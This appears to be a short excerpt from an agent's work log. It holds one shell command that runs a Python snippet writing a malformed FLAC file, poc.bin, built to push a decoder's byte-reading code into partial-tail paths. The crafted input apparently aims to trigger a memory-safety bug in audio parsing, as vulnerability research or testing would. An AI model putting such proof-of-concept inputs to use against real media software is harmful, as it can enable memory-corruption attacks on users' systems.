Command `cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
# Build a stream designed to force byte-aligned reads into the tail-byte path after a tiny buffer refill
payload = bytearray(b'fLaC')
# Streaminfo block
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# One small metadata-like payload to consume some bytes and leave a partial tail
payload += bytes([0x80,0x00,0x00,0x01]) + b'A' * 7
# Frame-like sequence plus truncated UTF-8 header number to induce byte-aligned helper use
payload += b'\xff\xf8\x69\x00\x00\xf0\x80\x80'
# Very short tail to force the partial-tail paths in byte readers
payload += b'\x00\x00\xff'
p.write_bytes(payload)
print('len', len(payload))
PY
